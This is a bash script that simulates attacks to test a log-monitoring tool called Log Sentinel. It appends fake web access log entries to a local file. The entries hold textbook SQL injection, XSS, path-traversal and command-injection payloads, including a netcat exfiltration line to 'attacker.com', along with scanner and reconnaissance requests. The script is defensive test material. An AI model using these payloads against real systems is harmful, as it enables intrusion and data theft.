#!/bin/bash
# Live Attack Simulator for Log Sentinel
# Run this in Terminal 2 while sentinel.py is running in Terminal 1

LOG_FILE="test_access.log"
DELAY=1  # seconds between each attack

log() {
    local ip=$1
    local path=$2
    local status=$3
    local useragent=$4
    local timestamp=$(date '+%d/%b/%Y:%H:%M:%S +0000')
    echo "$ip - - [$timestamp] \"GET $path HTTP/1.1\" $status 1234 \"-\" \"$useragent\"" >> "$LOG_FILE"
}

echo "Live Attack Simulator"
echo "========================"
echo "Appending to: $LOG_FILE"
echo "Watch Terminal 1 for alerts!"
echo ""
sleep 1

echo "[1/7] SQL Injection..."
log "192.168.1.100" "/login.php?id=1' UNION SELECT * FROM users--" "200" "Mozilla/5.0"
sleep $DELAY

log "192.168.1.100" "/search.php?q=1' OR '1'='1" "200" "Mozilla/5.0"
sleep $DELAY

echo "[2/7] XSS Attack..."
log "10.0.0.50" "/comment.php?text=<script>alert('XSS')</script>" "200" "Firefox/88.0"
sleep $DELAY

log "10.0.0.50" "/profile.php?bio=<img src=x onerror=alert(1)>" "200" "Chrome/90.0"
sleep $DELAY

echo "[3/7] Path Traversal..."
log "172.16.0.25" "/download.php?file=../../../../etc/passwd" "404" "curl/7.68.0"
sleep $DELAY

log "172.16.0.25" "/view.php?page=../../windows/system32/config/sam" "404" "wget/1.20"
sleep $DELAY

echo "[4/7] Command Injection..."
log "203.0.113.45" "/ping.php?host=google.com;cat /etc/passwd" "500" "Python/3.8"
sleep $DELAY

log "203.0.113.45" "/cmd.php?exec=ls+-la+|+nc+attacker.com+4444" "403" "curl/7.68.0"
sleep $DELAY

echo "[5/7] Security Scanners..."
log "198.51.100.89" "/admin" "404" "sqlmap/1.5.3"
sleep $DELAY

log "198.51.100.89" "/wp-admin" "404" "Nikto/2.1.6"
sleep $DELAY

log "198.51.100.89" "/phpmyadmin" "404" "nuclei/2.9.1"
sleep $DELAY

echo "[6/7] Rate Limit Abuse (20 rapid requests)..."
for i in {1..20}; do
    log "198.18.0.100" "/api/data?page=$i" "200" "bot-scraper/1.0"
done
sleep $DELAY

echo "[7/7] 404 Spam (Reconnaissance)..."
for path in /admin /backup /config /.env /secret /api/keys /debug /test /old /tmp; do
    log "192.0.2.123" "$path" "404" "Mozilla/5.0"
    sleep 0.2
done

echo ""
echo "All attacks sent!"
echo "Check Terminal 1 for alerts."
echo "Check alerts.log for the full record."
